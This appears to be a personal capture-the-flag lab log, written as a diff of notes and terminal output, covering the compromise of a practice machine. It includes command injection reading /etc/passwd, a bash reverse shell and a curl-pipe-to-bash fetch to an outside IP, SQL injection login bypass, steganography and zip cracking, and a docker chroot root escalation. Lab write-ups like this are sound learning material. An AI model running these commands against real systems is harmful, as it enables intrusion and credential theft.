@@ -1,0 +1,367 @@
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.219.74 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 12:53 EDT
+Nmap scan report for 10.10.219.74
+Host is up (0.099s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
+
+
+
+
+
+
+
+
+
+21/tcp open  ftp	
+                     
+                     anonymous:blank                                                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ cat note.txt    
+Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+
+
+22/tcp open  ssh   have hydra trying on apaar but nothing
+
+80/tcp open  http
+very elaborate website on 80, login link and searchbar for fun, page script doesn't reveal anything.
+/secret		you can type commands 
+
+
+
+──(kali㉿kali)-[~]
+└─$ nmap -sC --script=vuln 10.10.219.74
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 13:06 EDT
+Nmap scan report for 10.10.219.74
+Host is up (0.14s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+|_sslv2-drown: 
+22/tcp open  ssh
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /secret/: Potentially interesting folder
+| http-fileupload-exploiter: 
+|   
+|     Couldn't find a file-type field.
+|   
+|_    Couldn't find a file-type field.
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+| http-sql-injection: 
+|   Possible sqli for queries:
+|_    http://10.10.219.74:80/js/pp_images%5bset_position%5d;break;case"youtube":f=l(movie_width,movie_height),movie_id=o("v",pp_images[set_position]),""==movie_id&&(movie_id=pp_images[set_position].split("youtu.be/"),movie_id=movie_id[1],movie_id.indexOf("?%22%29=%27%20OR%20sqlspider
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+
+Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds
+
+
+
+there is a file local.txt ,,, just can't get it to print!!!
+
+ls;cat /etc/passwd
+images index.php 
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
+
+aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash 
+
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false 
+apaar:x:1001:1001:,,,:/home/apaar:/bin/bash 
+anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
+
+
+
+went to write up :(
+
+create bash shell
+
+bash -c "bash -i >& /dev/tcp/10.6.65.43/9001 0>&1"
+
+serve and listen 
+
+curl 10.6.65.43:8000/shell.sh | ba\sh
+
+
+escalate with 
+
+
+
+sudo -u apaar /home/apaar/.helpline.sh
+
+www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
+sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+/bin/bash
+/bin/bash
+/bin/bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+apaar@ubuntu:~$ whoami
+whoami
+apaar
+apaar@ubuntu:~$ ls
+ls
+local.txt
+apaar@ubuntu:~$ cat local.txt
+cat local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+we get the first flag, now we have to create ssh access,, double tunnel not sure if that all is necessary
+
+
+generate public key
+
+ssh-keygen -f apaar
+
+
+
+
+we do some basic sqli ' OR 1=1 -- -   and bypass login to get a picture,,, steghide
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ wget http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg 
+--2021-05-27 16:24:05--  http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg
+Resolving localhost (localhost)... ::1, 127.0.0.1
+Connecting to localhost (localhost)|::1|:9001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 68841 (67K) [image/jpeg]
+Saving to: ‘hacker-with-laptop_23-2147985341.jpg’
+
+hacker-with-laptop_2 100%[=====================>]  67.23K  --.-KB/s    in 0.1s    
+
+2021-05-27 16:24:06 (585 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ steghide info /home/kali/hacker-with-laptop_23-2147985341.jpg
+"hacker-with-laptop_23-2147985341.jpg":
+  format: jpeg
+  capacity: 3.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "backup.zip":
+    size: 750.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ steghide extract -sf /home/kali/hacker-with-laptop_23-2147985341.jpg       1 ⨯
+Enter passphrase: 
+wrote extracted data to "backup.zip".
+   
+   
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ unzip backup.zip > backup   
+[backup.zip] source_code.php password: 
+   skipping: source_code.php         incorrect password
+                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ zip2john backup.zip > backupToCrack                                       82 ⨯
+ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
+
+
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ john backupToCrack --wordlist=/usr/share/wordlists/rockyou.txt             1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+pass1word        (backup.zip/source_code.php)
+1g 0:00:00:00 DONE (2021-05-27 16:28) 14.28g/s 175542p/s 175542c/s 175542C/s toodles..havana
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ cat backup   
+Archive:  backup.zip
+  inflating: source_code.php         
+                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ cat source_code.php 
+<html>
+<head>
+	Admin Portal
+</head>
+        <title> Site Under Development ... </title>
+        <body>
+                <form method="POST">
+                        Username: <input type="text" name="name" placeholder="username"><br><br>
+			Email: <input type="email" name="email" placeholder="email"><br><br>
+			Password: <input type="password" name="password" placeholder="password">
+                        <input type="submit" name="submit" value="Submit"> 
+		</form>
+<?php
+        if(isset($_POST['submit']))
+	{
+		$email = $_POST["email"];
+		$password = $_POST["password"];
+		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
+		{ 
+			$random = rand(1000,9999);?><br><br><br>
+			<form method="POST">
+				Enter the OTP: <input type="number" name="otp">
+				<input type="submit" name="submitOtp" value="Submit">
+			</form>
+		<?php	mail($email,"OTP for authentication",$random);
+			if(isset($_POST["submitOtp"]))
+				{
+					$otp = $_POST["otp"];
+					if($otp == $random)
+					{
+						echo "Welcome Anurodh!";
+						header("Location: authenticated.php");
+					}
+					else
+					{
+						echo "Invalid OTP";
+					}
+				}
+ 		}
+		else
+		{
+			echo "Invalid Username or Password";
+		}
+        }
+?>
+</html>
+                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ echo -n IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d ; echo
+!d0ntKn0wmYp@ssw0rd
+
+
+
+on the second shell, 
+
+
+
+apaar@ubuntu:~$ su anurodh
+Password: 
+anurodh@ubuntu:/home/apaar$ whoami
+anurodh
+anurodh@ubuntu:/home/apaar$ cd ../anurodh
+anurodh@ubuntu:~$ ls
+source_code.php
+anurodh@ubuntu:~$ cd ..
+anurodh@ubuntu:/home$ ls
+anurodh  apaar  aurick
+anurodh@ubuntu:/home$ cd aurick
+bash: cd: aurick: Permission denied
+anurodh@ubuntu:/home$ sudo -l
+Matching Defaults entries for anurodh on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User anurodh may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+anurodh@ubuntu:/home$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# cd /root
+# ls
+proof.txt
+# cat proof.txt
+
+
+					{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+
+Congratulations! You have successfully completed the challenge.
+
+
+         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
+,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
+|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
+|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
+ \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
+ | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
+  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
+  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
+  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
+
+
+--------------------------------------------Designed By -------------------------------------------------------
+					|  Anurodh Acharya |
+					---------------------
+
+	               		     Let me know if you liked it.
+
+Twitter
+	- @acharya_anurodh
+Linkedin
+	- www.linkedin.com/in/anurodh-acharya-b1937116a
+
+
+
+# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
